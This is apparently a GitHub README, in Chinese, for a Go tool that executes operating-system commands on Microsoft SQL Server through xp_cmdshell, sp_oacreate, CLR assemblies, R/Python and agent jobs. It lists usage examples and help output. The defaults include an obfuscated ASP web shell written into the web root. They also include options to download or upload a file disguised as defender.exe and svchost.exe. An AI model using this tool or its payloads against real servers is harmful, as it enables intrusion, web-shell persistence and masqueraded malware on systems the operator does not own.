# mssql-command-tool

#### 声明
我没有学过go语言可能代码写的很垃圾，但是工具能用就行了。

因为wolvez老哥的没有写自定义mssql端口，我就添加了这个功能 
官方链接：[http://wolvez.club/2019/09/19/mssql-command-tool/](http://wolvez.club/2019/09/19/mssql-command-tool/)
感谢老哥分享。

dll文件代码:`[https://github.com/uknowsec/SharpSQLTools](https://github.com/uknowsec/SharpSQLTools/blob/master/SharpSQLTools/Setting.cs)`
因为在golang的github.com/denisenkom/go-mssqldb里面没有找到获取clr返回消息的打印方法，所以只能无显.如果有大佬知道怎么写显示欢迎私信.`admin@mayter.cn`

示例：
```
NAME:
   Mssql Toolkit - mssql command tool

USAGE:
   mssql-command-tools_Windows_64.exe [global options] command [command options] [arguments...]

AUTHOR:
   Microsoft.com clr参考: https://github.com/uknowsec/SharpSQLTools/

COMMANDS:
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --server value, --host value, -s value  The database server (default: "127.0.0.1")
   --user value, -u value                  The database user (default: "sa")
   --password value, -p value              The database password
   --database value, -d value              The database name (default: "msdb")
   --port value, -P value                  The database port (default: 1433)
   --option value                          -xcmd, -X powershell (default: "whoami")
   --query value, -q value, --sql value    SQL query (default: "select @@version")
   --cmd value, -c value, --exec value     Exec System Command | xp_cmdshell命令执行 (default: "whoami")
   --cmd1 value, --c1 value                Exec System Command | sp_oacreate无回显执行 (default: "whoami >C:\\whoami.log")
   --cmd2 value, --c2 value                Exec System Command | sp_oacreate有回显执行 | wscript.shell (default: "whoami")
   --cmdsp value                           Exec System Command | sp_oacreate有回显执行 | {72C24DD5-D70A-438B-8A42-98424B88AFB8} (default: "whoami")
   --cmd3 value, --c3 value                Exec System Command | clr无回显执行 | clr命令参考: https://github.com/uknowsec/SharpSQLTools/ (default: "clr_exec whoami")
   --cmdpy value                           Exec System Command | clr无回显执行 | clr命令参考: https://github.com/Ridter/PySQLTools (default: "clr_exec whoami")
   --cmd4 value, --c4 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd5 value, --c5 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
   --cmd6 value, --c6 value                Exec System Command | xp_cmdshell命令执行|过滤了xp_cmdshell等关键字提交方法语句 (default: "-c6 whoami")
   --cmd7 value, --c7 value                Exec System Command | 自写clr执行 (default: "-c7 whoami")
   --cmd8 value, --c8 value                Exec System Command | r language command (default: "-c8 whoami")
   --cmd9 value, --c9 value                Exec System Command | python language command (default: "-c9 whoami")
   --cmd10 value, --c10 value              Exec System Command | createAndStartJob command (default: "-c10 whoami >c:\\windows\\temp\\123.txt")
   --cmd11 value, --c11 value              Exec System Command | 自写clr执行 | --option -x --cmd11 cmd | --option -X --cmd11 powershell (default: "--option -x --cmd11 cmd")
   --dir value, --dirtree value            xp_dirtree列目录 | dir c:
   --path value                            网站路径 -path + -code | c:\inetpub\wwwroot\cmd.asp (default: "c:\\inetpub\\wwwroot\\cmd.asp")
   --local value                           本地路径 localFile (default: "c:\\1.txt")
   --remote value                          远程路径 remoteFile (default: "C:\\Windows\\Temp\\1.txt")
   --code value                            -path + -code | 如果代码有"就加\来匹配<%eval request("cmd")%>网站路径和asp密码默认:LandGrey (default: "<%@codepage=65000%><%@codepage=65000%><%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%>")
   --downurl value                         下载文件的url地址 | http://www.microsoft.com/defender.exe
   --filepath value                        下载文件的路径 | c:\programdata\svchost.exe
   --debug                                 Debug info
   --enable, -e                            Enabled xp_cmdshell
   --disable, --diclose                    Disable xp_cmdshell
   --ole, --oleopen                        Enabled sp_oacreate
   --dole, --dolose                        Disable sp_oacreate
   --clr, --clropen                        Enabled clr enabled
   --dclr, --dclose                        Disable clr enabled
   --rlce, --rlceopen                      r|python languag eenabled
   --install_clr, --in_clr                 install clr  | --cmd3 "clr_exec whoami" | clr命令参考: https://github.com/uknowsec/SharpSQLTools/
   --uninstall_clr, --un_clr               uninstall clr | --cmd3 "clr_exec whoami"
   --installpy_clr, --inpy_clr             installpy clr  | --cmdpy "clr_exec whoami" | clr命令参考: https://github.com/Ridter/PySQLTools
   --uninstallpy_clr, --unpy_clr           uninstallpy clr | --cmdpy "clr_exec whoami"
   --install_clrcmd, --in_clrcmd           install clrcmd | "--c4 net --c5 user"
   --uninstall_clrcmd, --un_clrcmd         uninstall clrcmd | "--c4 net --c5 user"
   --install_clrcmd1, --in_clrcmd1         install clrcmd1 | --cmd7 "whoami"
   --uninstall_clrcmd1, --un_clrcmd1       uninstall clrcmd | --cmd7 "whoami"
   --install_clrcmd2, --in_clrcmd2         install clrcmd2 | --cmd11 "whoami"
   --uninstall_clrcmd2, --un_clrcmd2       uninstall clrcmd2 | --cmd11 "whoami"
   --upload                                --upload --local c:\svchost.exe --remote C:\Windows\Temp\svchost.exe
   --help, -h                              show help
```
##### Windows环境

```
mssql-command-tool-win.exe

mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -c "whoami" -P 1438
mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -c "whoami" -port 1438

开启xp_cmdshell组件
mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -P 1438 --enable/--e

开启sp_oacreate组件
mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -P 1438 --ole/--o

执行命令：
mssql-command-tool-win.exe -host 127.0.0.1 -u sa -p admin -C "c:\windows\system32\cmd.exe /c whoami >c:\whoami.txt -port 1438
```

##### Linux环境

```
mssql-command-tool-linux

./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -c "whoami" -P 1438
./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -c "whoami" -port 1438

开启xp_cmdshell组件
./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -P 1438 --enable/--e

开启sp_oacreate组件
./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -P 1438 --ole/--o

执行命令：
./mssql-command-tool-linux -host 127.0.0.1 -u sa -p admin -C "c:\windows\system32\cmd.exe /c whoami >c:\whoami.txt -port 1438
```

来源:
```
https://github.com/Ridter/PySQLTools
https://github.com/uknowsec/SharpSQLTools
```
